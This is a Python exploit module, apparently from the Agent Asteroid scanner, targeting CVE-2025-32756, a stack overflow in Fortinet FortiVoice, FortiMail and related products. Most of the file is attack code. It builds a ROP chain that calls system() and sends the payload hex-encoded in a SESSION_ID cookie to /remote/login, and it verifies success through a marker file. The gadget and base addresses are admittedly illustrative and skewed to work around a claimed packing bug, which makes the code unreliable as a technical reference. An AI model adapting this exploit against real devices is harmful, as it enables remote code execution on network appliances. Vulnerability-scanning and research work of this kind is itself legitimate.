"""Agent Asteroid implementation for CVE-2025-32756."""

import datetime
import logging
import secrets
import time

import pwn
import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning as Urllib3InsecureRequestWarning

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

urllib3.disable_warnings(category=Urllib3InsecureRequestWarning)

VULNERABILITY_TITLE: str = (
    "Fortinet Multiple Products - Stack-Based Overflow (CVE-2025-32756)"
)
VULNERABILITY_REFERENCE: str = "CVE-2025-32756"
VULNERABILITY_DESCRIPTION: str = """
A stack-based overflow vulnerability [CWE-121] in FortiVoice, FortiMail, FortiNDR,
FortiRecorder, and FortiCamera may allow a remote unauthenticated attacker
to execute arbitrary code or commands via crafted HTTP requests.
This exploit attempts to leverage this via a ROP chain, assuming a non-ASLR,
no-canary environment with known memory layout (offsets are illustrative).
This exploit writes a marker file for verification.
Uses Pwntools for robust address packing.
NOTE: The Python environment where this agent is run has shown anomalous
behavior in packing large integers to bytes. Addresses have been chosen
to produce safe byte sequences with the observed packer behavior,
but may not correspond to functional exploit addresses on a real target
without adjusting to a correctly functioning Python environment.
"""
RISK_RATING: str = "CRITICAL"
DEFAULT_TIMEOUT: datetime.timedelta = datetime.timedelta(seconds=10)

# --- Exploit Configuration Constants ---
TARGET_USE_HTTPS: bool = False
TARGET_VULNERABLE_PATH: str = "/remote/login"
TARGET_ARCHITECTURE: str = "amd64"
TARGET_ENDIANNESS: str = "little"

STACK_BUFFER_OFFSET: int = 64
STACK_BUFFER_SIZE: int = 256
STACK_CANARY_OFFSET: int = 0
STACK_SAVED_RBP_OFFSET: int = 328
STACK_RETURN_ADDRESS_OVERWRITE_OFFSET: int = 336

ROP_COMMAND_VERIFICATION: str = "sh -c 'echo CVE_2025_32756_PWNED > /tmp/pwned_cve2025_32756.txt && chmod 777 /tmp/pwned_cve2025_32756.txt'"
ROP_FLAT_GADGETS: dict[str, int] = {"pop_rdi_ret": 0x401A23}
ROP_MODULE_GADGET_OFFSETS: dict[str, dict[str, int]] = {}

PAYLOAD_BAD_CHARS_HEX: list[str] = ["00", "0a", "0d"]

# MODIFIED FOR WORKAROUND: Choose a base that results in a "safe" packed RET address
# given the anomalous Python packing behavior.
# Original was 0x7FFFFFFDE000. New one aims for RET = 0x4142434445464748
# exploit_code_start_off is 336 (0x150)
# New ADDR_FIXED_INPUT_BUFFER_BASE = 0x4142434445464748 - 0x150
ADDR_FIXED_INPUT_BUFFER_BASE: int = 0x41424344454645F8
# ADDR_FIXED_INPUT_BUFFER_BASE: int = 0x7FFFFFFDE000 # Original value causing issues

ADDR_FIXED_TARGET_BINARY_BASE: int = 0x400000
ADDR_FIXED_LIBC_BASE: int = 0x7FFFF7C00000

ADDR_MODULE_OFFSETS: dict[str, dict[str, int]] = {"libc": {"system": 0x50D60}}

VERIFICATION_HTTP_FILE_PATH: str = "/pwned_cve2025_32756.txt"
VERIFICATION_HTTP_EXPECTED_CONTENT: str = "CVE_2025_32756_PWNED"
VERIFICATION_TIMEOUT_SECONDS: int = 5

STEALTH_RANDOM_PADDING_SIZE: int = 0
TRIGGER_HTTP_METHOD: str = "GET"
TRIGGER_COOKIE_NAME: str = "SESSION_ID"
TRIGGER_PAYLOAD_LOCATION: str = "cookie_hex"

TIMING_REQUEST_TIMEOUT_SECONDS: int = 10
TIMING_POST_TRIGGER_DELAY_SECONDS: int = 5
TIMING_DELAY_BETWEEN_VERIFICATION_SECONDS: int = 1

ADDRESS_PLACEHOLDER_BYTES = b"\xde\xc0\xde\xad\xbe\xef\xba\xbe"


def _addr_key(module: str, symbol: str | int) -> str:
    return f"{module}_{str(symbol)}"


@exploits_registry.register
class FortinetCVE202532756Exploit(webexploit.WebExploit):
    metadata: definitions.VulnerabilityMetadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
    pointer_size: int

    def __init__(self) -> None:
        super().__init__()
        self.http: requests.Session = requests.Session()
        self.http.verify = False

        if pwn is None:
            raise ImportError("Pwntools could not be imported. Exploit cannot run.")

        pwn.context.arch = TARGET_ARCHITECTURE
        pwn.context.endian = TARGET_ENDIANNESS

        if pwn.context.arch in ["amd64", "aarch64"]:
            self.pointer_size = 8
        elif pwn.context.arch in ["i386", "arm"]:
            self.pointer_size = 4
        elif hasattr(pwn.context, "bits") and pwn.context.bits in [32, 64]:
            self.pointer_size = pwn.context.bits // 8
        else:
            raise ValueError(
                f"Could not determine pointer size for Pwntools arch: {pwn.context.arch}"
            )

        self.bad_chars_set: set[int] = {int(b, 16) for b in PAYLOAD_BAD_CHARS_HEX}
        self.base_addresses: dict[str, int] = {
            "input_buffer_base": ADDR_FIXED_INPUT_BUFFER_BASE,
            "target_binary": ADDR_FIXED_TARGET_BINARY_BASE,
            "libc": ADDR_FIXED_LIBC_BASE,
        }
        self.all_gadgets: dict[str, int] = {}
        self.all_addresses: dict[str, int] = {}
        self.rop_cmd_addr_placeholder_offset: int = -1

    def _pack_address(self, addr: int) -> bytes:
        if not isinstance(addr, int):
            raise TypeError(f"Address must be int, got {type(addr)}")

        if pwn is None:
            raise RuntimeError("Pwntools not available for packing.")

        try:
            if self.pointer_size == 8:
                return pwn.p64(addr)
            elif self.pointer_size == 4:
                return pwn.p32(addr)
            else:
                raise ValueError(
                    f"Unsupported pointer size for Pwntools packing: {self.pointer_size}"
                )
        except Exception as e:
            logging.error(f"Pwntools packing error for {hex(addr)}: {e}")
            raise ValueError(f"Pwntools packing failed for {hex(addr)}") from e

    def _generate_safe_random_padding(self, n: int) -> bytes:
        if n <= 0:
            return b"\xff" * abs(n)
        if not self.bad_chars_set:
            return secrets.token_bytes(n)
        if len(self.bad_chars_set) == 256:
            raise ValueError("All bytes forbidden for padding.")
        padding = bytearray()
        for _ in range(n * 20):
            if len(padding) >= n:
                break
            byte = secrets.token_bytes(1)[0]
            if byte not in self.bad_chars_set:
                padding.append(byte)
        if len(padding) < n:
            raise ValueError(f"Padding gen failed: got {len(padding)}/{n} bytes.")
        return bytes(padding)

    def _update_dependent_addresses(self) -> None:
        logging.info("Populating dynamic addresses from base addresses and offsets...")
        self.all_gadgets = ROP_FLAT_GADGETS.copy()
        for module, offsets in ROP_MODULE_GADGET_OFFSETS.items():
            base = self.base_addresses.get(module)
            if base is not None:
                for name, offset in offsets.items():
                    self.all_gadgets[_addr_key(module, name)] = base + offset
            else:
                logging.warning(f"Base for module '{module}' not found for gadgets.")
        self.all_addresses = {}
        for module, offsets in ADDR_MODULE_OFFSETS.items():
            base = self.base_addresses.get(module)
            if base is not None:
                for name, offset in offsets.items():
                    self.all_addresses[_addr_key(module, name)] = base + offset
            else:
                logging.warning(f"Base for module '{module}' not found for symbols.")
        logging.debug(f"Gadgets: {self.all_gadgets}, Addresses: {self.all_addresses}")

    def _build_exploit_code(self) -> bytes | None:
        logging.info("Building ROP payload for command: %s", ROP_COMMAND_VERIFICATION)
        try:
            cmd_suffix = ROP_COMMAND_VERIFICATION.encode("utf-8") + b"\x00"
            pop_rdi = self.all_gadgets.get("pop_rdi_ret")
            if pop_rdi is None:
                logging.error("ROP build: Missing pop_rdi_ret")
                return None
            sys_addr = self.all_addresses.get(_addr_key("libc", "system"))
            if sys_addr is None:
                logging.error("ROP build: Missing system address")
                return None

            p_pop_rdi = self._pack_address(pop_rdi)
            p_sys = self._pack_address(sys_addr)

            self.rop_cmd_addr_placeholder_offset = len(p_pop_rdi)
            rop_prim = (
                    p_pop_rdi + ADDRESS_PLACEHOLDER_BYTES[: self.pointer_size] + p_sys
            )
            logging.info(
                f"Built ROP (len {len(rop_prim)}) + cmd (len {len(cmd_suffix)})."
            )
            return rop_prim + cmd_suffix
        except (ValueError, TypeError) as e:
            logging.error(f"ROP build error (possibly from packing): {e}")
            return None

    def _craft_exploit_payload(self, unpatched_code: bytes | None) -> bytes | None:
        if unpatched_code is None:
            logging.error("Unpatched code is None.")
            return None
        logging.info("Crafting full payload and patching ROP command address...")
        try:
            canary_s = (
                (STACK_SAVED_RBP_OFFSET - STACK_CANARY_OFFSET)
                if 0 < STACK_CANARY_OFFSET < STACK_SAVED_RBP_OFFSET
                else (self.pointer_size if STACK_CANARY_OFFSET > 0 else 0)
            )
            rbp_s = self.pointer_size if STACK_SAVED_RBP_OFFSET > 0 else 0
            overwrite_block_s = canary_s + rbp_s + self.pointer_size
            padding_before_ow = (
                                        STACK_RETURN_ADDRESS_OVERWRITE_OFFSET - overwrite_block_s
                                ) - (STACK_BUFFER_OFFSET + STACK_BUFFER_SIZE)
            if padding_before_ow < 0:
                logging.error(f"Negative padding_before_overwrite: {padding_before_ow}")
                return None

            exploit_code_start_off = (
                    STACK_BUFFER_OFFSET
                    + STACK_BUFFER_SIZE
                    + padding_before_ow
                    + overwrite_block_s
                    + STEALTH_RANDOM_PADDING_SIZE
            )
            exploit_code_live_ad = (
                    self.base_addresses["input_buffer_base"] + exploit_code_start_off
            )

            # Log the intended return address before packing with Pwntools
            logging.info(
                f"[EXPLOIT_CRAFT] Intended RET ADDR (exploit_code_live_ad): {hex(exploit_code_live_ad)}"
            )

            patched_rop_code = bytearray(unpatched_code)
            if self.rop_cmd_addr_placeholder_offset != -1:
                len_rop_gadgets = (
                        self.rop_cmd_addr_placeholder_offset + self.pointer_size * 2
                )
                live_cmd_str_ad = exploit_code_live_ad + len_rop_gadgets
                packed_cmd_ad = self._pack_address(live_cmd_str_ad)
                p_start = self.rop_cmd_addr_placeholder_offset
                patched_rop_code[p_start: p_start + self.pointer_size] = packed_cmd_ad
                logging.info(
                    f"Patched ROP: cmd string live_addr {hex(live_cmd_str_ad)}"
                )

            final_rop_code_section = bytes(patched_rop_code)
            payload_prefix = bytearray()
            payload_prefix.extend(b"A" * STACK_BUFFER_OFFSET)
            payload_prefix.extend(b"A" * STACK_BUFFER_SIZE)
            if padding_before_ow > 0:
                payload_prefix.extend(
                    self._generate_safe_random_padding(padding_before_ow)
                )
            if STACK_CANARY_OFFSET > 0:
                payload_prefix.extend(b"\xcc" * canary_s)
            if STACK_SAVED_RBP_OFFSET > 0:
                payload_prefix.extend(b"R" * rbp_s)

            packed_return_address = self._pack_address(exploit_code_live_ad)
            payload_prefix.extend(packed_return_address)

            if STEALTH_RANDOM_PADDING_SIZE > 0:
                payload_prefix.extend(
                    self._generate_safe_random_padding(STEALTH_RANDOM_PADDING_SIZE)
                )

            scannable_prefix_part = bytes(payload_prefix[STACK_BUFFER_OFFSET:])
            bad_chars_details = []
            for i, b_val in enumerate(scannable_prefix_part):
                if b_val in self.bad_chars_set:
                    abs_offset = STACK_BUFFER_OFFSET + i
                    bad_chars_details.append(
                        f"byte 0x{b_val:02x} at prefix_scan_offset {i} (abs {abs_offset})"
                    )
            if bad_chars_details:
                err_msg = (
                    f"BadCharsDBG: Details: {', '.join(bad_chars_details)}. "
                    f"RET_AD_Value_Used_For_Packing: {hex(exploit_code_live_ad)}. "
                    f"Packed_Bytes_For_RET_AD (from Pwntools): {packed_return_address.hex()}. "
                    f"ScannablePrefixHex (sample): {scannable_prefix_part.hex() if len(scannable_prefix_part) < 128 else scannable_prefix_part[:64].hex() + '...'}"
                )
                raise ValueError(err_msg)

            full_payload = payload_prefix
            full_payload.extend(final_rop_code_section)
            logging.info(f"Payload crafted. Total length: {len(full_payload)}")
            return bytes(full_payload)
        except (ValueError, TypeError) as e:
            logging.error(f"Payload crafting error: {e}")
            return None

    def _trigger_vulnerability(
            self, payload: bytes | None, host: str, port: int
    ) -> bool:
        if payload is None:
            logging.error("Payload is None.")
            return False
        url = f"{'https' if TARGET_USE_HTTPS else 'http'}://{host}:{port}{TARGET_VULNERABLE_PATH}"
        headers: dict[str, str] = {}
        if TRIGGER_PAYLOAD_LOCATION == "cookie_hex":
            cookies = {TRIGGER_COOKIE_NAME: payload.hex()}
        else:
            logging.error(f"Unsupported trigger location: {TRIGGER_PAYLOAD_LOCATION}")
            return False
        logging.info(
            f"Triggering: {TRIGGER_HTTP_METHOD} {url} cookie '{TRIGGER_COOKIE_NAME}'"
        )
        try:
            self.http.request(
                method=TRIGGER_HTTP_METHOD,
                url=url,
                cookies=cookies,
                headers=headers,
                timeout=TIMING_REQUEST_TIMEOUT_SECONDS,
            )
            logging.info("Trigger request sent.")
            return True
        except requests.exceptions.Timeout:
            logging.info("Trigger timed out (expected?).")
            return True
        except requests.exceptions.RequestException as e:
            logging.error(f"Trigger failed: {e}")
            return False

    def _verify_exploit_success(self, host: str, port: int) -> bool:
        logging.info("Verifying exploit success...")
        time.sleep(TIMING_POST_TRIGGER_DELAY_SECONDS)
        url = f"{'https' if TARGET_USE_HTTPS else 'http'}://{host}:{port}{VERIFICATION_HTTP_FILE_PATH}"
        logging.info(f"Fetching verification file: {url}")
        try:
            resp = self.http.get(url, timeout=VERIFICATION_TIMEOUT_SECONDS)
            if (
                    resp.status_code == 200
                    and VERIFICATION_HTTP_EXPECTED_CONTENT.encode() in resp.content
            ):
                logging.info(
                    f"Verification success: Found expected content in '{VERIFICATION_HTTP_FILE_PATH}'."
                )
                return True
            logging.debug(
                f"Verify failed: {url} status {resp.status_code}, content mismatch/not found."
            )
        except requests.exceptions.RequestException as e:
            logging.debug(f"Verify HTTP error for '{VERIFICATION_HTTP_FILE_PATH}': {e}")
        return False

    def accept(self, target: definitions.Target) -> bool:
        host, port_ = target.host, target.port or (80 if not TARGET_USE_HTTPS else 443)
        url = f"{'https' if TARGET_USE_HTTPS else 'http'}://{host}:{port_}{TARGET_VULNERABLE_PATH}"
        logging.info(f"Accept check: HEAD {url}")
        try:
            resp = self.http.head(
                url, timeout=DEFAULT_TIMEOUT.seconds / 2, allow_redirects=True
            )
            srv_hdr = resp.headers.get("Server", "").lower()
            if any(
                    ident in srv_hdr for ident in ["fortinet", "fortivoice", "fortimail"]
            ):
                logging.info(f"Accept: Fortinet server header detected at {url}.")
                return True
            if resp.status_code < 500:
                logging.info(
                    f"Accept: Connected to {url} (status {resp.status_code}). Potentially relevant."
                )
                return True
            logging.info(f"Accept: Status {resp.status_code} for {url}.")
        except requests.exceptions.RequestException as e:
            logging.debug(f"Accept: Connection failed for {url}: {e}")
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulns: list[definitions.Vulnerability] = []
        if pwn is None:
            logging.error("Pwntools is not imported, cannot proceed with check.")
            return vulns

        self._update_dependent_addresses()
        unpatched = self._build_exploit_code()
        if unpatched is None:
            logging.error("Exploit code build failed.")
            return vulns

        final_payload = self._craft_exploit_payload(unpatched)
        if final_payload is None:
            logging.error("Payload crafting phase failed.")
            return vulns

        port_ = target.port or (80 if not TARGET_USE_HTTPS else 443)
        self._trigger_vulnerability(final_payload, target.host, port_)

        if self._verify_exploit_success(target.host, port_):
            logging.info("Exploit verification successful!")
            vulns.append(self.create_vulnerability(target=target))
        else:
            logging.warning("Exploit verification failed.")
        return vulns
